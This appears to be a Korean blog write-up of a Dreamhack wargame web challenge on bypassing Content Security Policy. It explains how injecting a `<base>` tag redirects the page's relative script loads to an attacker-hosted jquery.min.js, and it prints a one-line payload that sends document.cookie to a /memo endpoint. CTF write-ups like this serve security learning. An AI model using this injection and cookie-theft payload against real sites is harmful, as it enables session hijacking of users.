---
title: "드림핵 lv.3 - CSP Bypass Bypass"
date: 2025-03-21 00:10:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, csp] 
description: 드림핵 CSP Bypass Advanced 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/436](https://dreamhack.io/wargame/challenges/436)
# 문제 설명
Exercise: CSP Bypass의 패치된 문제입니다.

---
# 문제 풀이
이 전에 다루었던 [CSP Bypass](https://hoonsooni.com/posts/dreamhack_csp_bypass/) 문제의 심화 문제이다. <br />
전체적인 웹사이트의 달라진 점은 없고 CSP를 우회하는 것이 조금 더 까다로워졌다.<br />

웹사이트는 [XSS Filtering Bypass](https://hoonsooni.com/posts/dreamhack_xss_filtering_bypass/), [XSS Filtering Bypass Advanced](https://hoonsooni.com/posts/dreamhack_xss_filtering_bypass_advanced/), [CSP Bypass](https://hoonsooni.com/posts/dreamhack_csp_bypass/)에서 다뤄진 것과 거의 동일하기 때문에 특별히 분석할 것이 없다.
## 코드 분석
### app.py
```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return render_template("vuln.html", param=param, nonce=nonce)
```
나머지 코드는 거의 비슷하기 때문에 크게 달라진 부분만 가져와봤다.<br />

원래라면 /vuln 페이지에서는 param으로 들어가는 값을 그대로 리턴해주기 때문에 스크립트 코드의 실행 결과를 해당 페이지에서 볼 수 있었는데 이번에는 vuln.html이라는 페이지로 넘기면서 코드가 아닌 코드처럼 보이는 "문자열"이 그냥 화면에 출력되게끔 바뀌었다.<br />

그렇기 때문에 이 전에 시도했던 방식을 시도해보면 alert 창이 뜨지 않고 HTML 코드에만 script 태그가 들어간 것을 볼 수 있다. 문자열 그대로 들어간거기 때문에 실행은 되지 않는다.<br />
## 최종 풀이
우리가 지금 `<script>` 태그를 실행할 수 없는 이유는 HTTP 해더에 CSP 설정 값으로 막아두었기 때문이다.<br />
전 문제에서는 이를 우회하기 위해서 src 속성을 사용했지만 그것도 먹히지 않는다.<br />

드림핵 강의에서 CSP 우회 방법 중에 `<base>` 태그에 대해 다룬 적이 있다.<br />
해당 태그는 현재 서버가 운영중인 웹서비스의 기본 URL을 변경한다는 의미이다.<br />

예를 들어 www.google.com에 접속했을 때 해당 페이지의 기본 URL은 당연하게도 www.google.com이다.<br />
그렇기 때문에 해당 페이지에서 `<a href="/login" />`같은 링크를 눌렀을 때 기본 URL + /login으로 이동돼 최종적으로 www.google.com/login 페이지로 이동이 가능한 것이다.<br />
### base URL로 할 수 있는 것
/vuln 페이지의 HTML을 살펴보다 보면 해당 페이지가 로드될 때 실행되는 스크립트 주소가 보이게 된다.

```html
<script src="/static/js/jquery.min.js" nonce=""></script>
<script src="/static/js/bootstrap.min.js" nonce=""></script>
```
이렇게 두 스크립트가 실행된다.<br />

두 스크립트 모두 소스코드 주소(src 속성)를 절대 주소가 아니라 상대 주소를 사용하기 때문에 base URL을 변경해주면 내가 원하는 위치의 스크립트를 불러와 실행할 수 있게된다.<br />

즉, 지금 현재 baseURL은 "http://host3.dreamhack.games:14010"이기 때문에 /vuln 페이지에 접속할 때마다 "http://host3.dreamhack.games:14010/static/js/jquery.min.js"에 있는 코드를 실행한다는 것이다.<br />

`<base>` 태그를 이용해서 기본 주소를 변경해주고 내가 작성한 임의의 코드를 "임의서버주소/static/js/jquery.min.js" 위치에 저장함으로써 우리가 원하는 행위를 할 수 있게되는 것이다.<br />
### 익스플로잇
```js
location.href="http://127.0.0.1/memo?memo=" + document.cookie;
```
본인은 현재 운영중인(지금 보고계신 웹사이트) 개인 서버의 "/static/js/jquery.min.js" 위치에 위 코드를 입력하고 /vuln?param 값으로 `<base href="https://www.hoonsooni.com" />`을 넘겨주었다.<br />

하지만 무슨 짓을 해도 작동을 안한다. 시도해봄직한 경우의 수는 거의 다 시도해보고 테스트도 거쳐봤는데 무슨 수를 써도 /memo?memo= 뒤에 어떠한 문자열도 들어가지 않는 문제가 발생한다.<br />

그래서 혹시나 다른 서버를 이용하면 작동을 할까 싶어서 replit에 무료로 간단한 서버를 하나 올리고 거기에도 똑같은 위치에 똑같은 파일을 작성하니 이제 작동한다.<br />

/memo 페이지에 접속하면 플래그를 볼 수 있다.<br />

처음으로 시도했던 방법이 왜 안먹히는지는 아직 알아내지 못했다. 드림핵에 질문을 남겨도 일주일 넘게 아무런 답변을 받지 못했다.
# 배운 것
`<base>` 태그라는 것이 존재하는지 처음 알았고 해당 태그를 이용해서 내가 원하는 코드를 실행시키는 방법도 있는 것에 대해 놀랐다.